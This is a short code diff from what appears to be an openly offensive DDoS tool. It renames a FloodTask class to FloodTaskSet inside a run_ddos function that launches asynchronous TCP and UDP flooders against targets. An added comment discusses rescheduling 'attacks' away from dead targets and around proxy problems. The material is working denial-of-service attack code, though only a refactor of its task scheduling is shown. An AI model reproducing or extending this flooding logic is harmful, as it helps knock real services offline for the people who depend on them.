@@ -32,7 +32,7 @@ WINDOWS_WAKEUP_SECONDS = 0.5
 AsyncFlood = Union[AsyncTcpFlood, AsyncUdpFlood]
 
 
-class FloodTask:
+class FloodTaskSet:
 
     def __init__(self, runnable: AsyncFlood, scale: int = 1):
         self._runnable = runnable
@@ -43,6 +43,10 @@ class FloodTask:
     def _launch_task(self) -> asyncio.Task:
         return asyncio.create_task(safe_run(self._runnable.run))
 
+    # XXX: reimplement this algorithm for attacks scheduling
+    #      as it consumes too much resources for dead targets while
+    #      being unfairly slow to those cases where we caught problems
+    #      because of proxies
     async def loop(self) -> None:
         try:
             tasks = set(self._launch_task() for _ in range(self._scale))
@@ -153,12 +157,12 @@ async def run_ddos(
         scale = max(1, (total_threads // num_tcp) if num_tcp > 0 else 0)
 
         for flooder in tcp_flooders:
-            task = asyncio.create_task(FloodTask(flooder, scale).loop())
+            task = asyncio.create_task(FloodTaskSet(flooder, scale).loop())
             # XXX: add stats for running/cancelled tasks with add_done_callback
             active_flooder_tasks.append(task)
         
         for flooder in udp_flooders:
-            task = asyncio.create_task(FloodTask(flooder).loop())
+            task = asyncio.create_task(FloodTaskSet(flooder).loop())
             active_flooder_tasks.append(task)
 
     try:
